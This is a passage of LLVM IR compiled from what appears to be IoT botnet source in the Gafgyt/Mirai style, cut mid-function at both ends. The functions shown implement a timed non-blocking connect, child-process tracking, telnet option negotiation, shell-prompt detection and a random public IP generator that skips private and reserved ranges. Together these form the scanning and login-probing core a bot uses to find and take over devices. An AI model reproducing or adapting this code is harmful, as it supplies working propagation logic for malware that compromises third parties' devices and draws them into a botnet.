  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !3
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #2
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %136, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %137

; <label>:50:                                     ; preds = %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %53 = getelementptr inbounds [16 x i64], [16 x i64]* %52, i64 0, i64 0
  %54 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %53) #2, !srcloc !4
  %55 = extractvalue { i64, i64* } %54, 0
  %56 = extractvalue { i64, i64* } %54, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %24, align 4
  %58 = ptrtoint i64* %56 to i64
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %25, align 4
  br label %60

; <label>:60:                                     ; preds = %51
  %61 = load i32, i32* %10, align 4
  %62 = srem i32 %61, 64
  %63 = zext i32 %62 to i64
  %64 = shl i64 1, %63
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %66 = load i32, i32* %10, align 4
  %67 = sdiv i32 %66, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %70, %64
  store i64 %71, i64* %69, align 8
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %75 = icmp slt i32 %74, 1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %60
  br label %137

; <label>:77:                                     ; preds = %60
  %78 = load i8*, i8** %15, align 8
  %79 = load i32, i32* %18, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  store i8* %81, i8** %23, align 8
  %82 = load i32, i32* %10, align 4
  %83 = load i8*, i8** %23, align 8
  %84 = call i64 @recv(i32 %82, i8* %83, i64 1, i32 0)
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %19, align 4
  %86 = load i32, i32* %19, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %91, label %88

; <label>:88:                                     ; preds = %77
  %89 = load i32, i32* %19, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %88, %77
  store i32 0, i32* %9, align 4
  br label %142

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %19, align 4
  %94 = load i32, i32* %18, align 4
  %95 = add nsw i32 %94, %93
  store i32 %95, i32* %18, align 4
  %96 = load i8*, i8** %23, align 8
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 255
  br i1 %99, label %100, label %122

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %10, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i64 @recv(i32 %101, i8* %103, i64 2, i32 0)
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %19, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %108, %100
  store i32 0, i32* %9, align 4
  br label %142

; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* %19, align 4
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, %113
  store i32 %115, i32* %18, align 4
  %116 = load i32, i32* %10, align 4
  %117 = load i8*, i8** %23, align 8
  %118 = call i32 @negotiate(i32 %116, i8* %117, i32 3)
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %121, label %120

; <label>:120:                                    ; preds = %112
  store i32 0, i32* %9, align 4
  br label %142

; <label>:121:                                    ; preds = %112
  br label %136

; <label>:122:                                    ; preds = %92
  %123 = load i8*, i8** %15, align 8
  %124 = load i8*, i8** %11, align 8
  %125 = call i8* @strstr(i8* %123, i8* %124) #10
  %126 = icmp ne i8* %125, null
  br i1 %126, label %134, label %127

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %12, align 4
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %127
  %131 = load i8*, i8** %15, align 8
  %132 = call i32 @matchPrompt(i8* %131)
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %130, %122
  store i32 1, i32* %20, align 4
  br label %137

; <label>:135:                                    ; preds = %130, %127
  br label %136

; <label>:136:                                    ; preds = %135, %121
  br label %33

; <label>:137:                                    ; preds = %134, %76, %48
  %138 = load i32, i32* %20, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  store i32 1, i32* %9, align 4
  br label %142

; <label>:141:                                    ; preds = %137
  store i32 0, i32* %9, align 4
  br label %142

; <label>:142:                                    ; preds = %141, %140, %120, %111, %91
  %143 = load i32, i32* %9, align 4
  ret i32 %143
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp slt i32 %5, 255
  br i1 %6, label %7, label %40

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %40

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %13 = zext i8 %12 to i32
  %14 = icmp slt i32 %13, 255
  br i1 %14, label %15, label %40

; <label>:15:                                     ; preds = %11
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %17 = zext i8 %16 to i32
  %18 = icmp slt i32 %17, 255
  br i1 %18, label %19, label %40

; <label>:19:                                     ; preds = %15
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %21 = add i8 %20, 1
  store i8 %21, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %23 = add i8 %22, 1
  store i8 %23, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %25 = add i8 %24, 1
  store i8 %25, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %26 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %27 = add i8 %26, 1
  store i8 %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %28 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %29 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %30 = zext i8 %29 to i32
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %36 = zext i8 %35 to i32
  %37 = call i32 (i8*, i8*, ...) @szprintf(i8* %28, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %30, i32 %32, i32 %34, i32 %36)
  %38 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %39 = call i32 @inet_addr(i8* %38) #2
  store i32 %39, i32* %1, align 4
  br label %197

; <label>:40:                                     ; preds = %15, %11, %7, %0
  %41 = call i32 @rand() #2
  %42 = srem i32 %41, 255
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %44 = call i32 @rand() #2
  %45 = srem i32 %44, 255
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %47 = call i32 @rand() #2
  %48 = srem i32 %47, 255
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %50 = call i32 @rand() #2
  %51 = srem i32 %50, 255
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %53

; <label>:53:                                     ; preds = %171, %40
  %54 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %169, label %57

; <label>:57:                                     ; preds = %53
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br i1 %60, label %169, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 100
  br i1 %64, label %65, label %73

; <label>:65:                                     ; preds = %61
  %66 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sge i32 %67, 64
  br i1 %68, label %69, label %73

; <label>:69:                                     ; preds = %65
  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 127
  br i1 %72, label %169, label %73

; <label>:73:                                     ; preds = %69, %65, %61
  %74 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 127
  br i1 %76, label %169, label %77

; <label>:77:                                     ; preds = %73
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 169
  br i1 %80, label %81, label %85

; <label>:81:                                     ; preds = %77
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 254
